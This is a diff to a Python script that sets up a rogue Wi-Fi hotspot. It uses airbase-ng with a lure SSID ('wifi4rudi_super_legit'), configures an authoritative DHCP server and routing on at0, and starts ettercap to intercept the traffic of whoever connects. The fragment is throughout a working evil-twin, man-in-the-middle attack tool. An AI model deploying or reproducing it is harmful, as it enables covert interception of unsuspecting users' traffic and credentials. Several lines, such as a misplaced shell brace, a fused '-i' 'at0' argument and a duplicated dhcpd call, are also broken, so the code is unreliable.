@@ -11,24 +11,24 @@ def configure_dhcp():
 	os.system("echo dhcp")
 	os.system("sudo rm /etc/dhcp/dhcpd.conf")
 	os.system("sudo touch /etc/dhcp/dhcpd.conf")
-        os.system("sudo echo 'DHCPDARGS=wlan0;' >> /etc/dhcp/dhcpd.conf")
-	os.system("sudo echo 'ddns-update-style none;' >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo 'option domain-name \"home\";' >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'ddns-update-style none;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'authoritative;' >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo 'subnet 192.168.255.0 netmask 255.255.255.0' { >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo 'option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo 'option broadcast-address 192.168.255.255;' >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo 'option routers 192.168.255.1;' >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo 'option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
-	os.system("sudo echo 'range 192.168.255.85 192.168.255.90;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'range 192.168.255.2 192.168.255.90;' >> /etc/dhcp/dhcpd.conf")
 	os.system("sudo echo '}' >> /etc/dhcp/dhcpd.conf")
 
 def make_mon():
 	os.system("echo mon")
 	start_monitor("wlan0")
 	command= ["sudo","airbase-ng", "-e"]
-	command.append("wifi4rudi_very_legit")
+	command.append("wifi4rudi_super_legit")
 	command.append("-c")
 	command.append("9")
 	command.append("mon0")
@@ -50,8 +50,9 @@ def setroute():
 	os.system("sudo ifconfig at0 up")
 	os.system("sudo ifconfig at0 192.168.255.1 netmask 255.255.255.0")
 	os.system("/sbin/route add -net 192.168.255.0 netmask 255.255.255.0 gw 192.168.255.1")
+	os.system("dhcpd at0")
 	os.system("sudo service isc-dhcp-server restart")
-
+	os.system("dhcpd at0")
 def runettercap():
 	os.system("echo ettercap")
 	command=['sudo', "ettercap", "-T", "-q", "-i" "at0"]
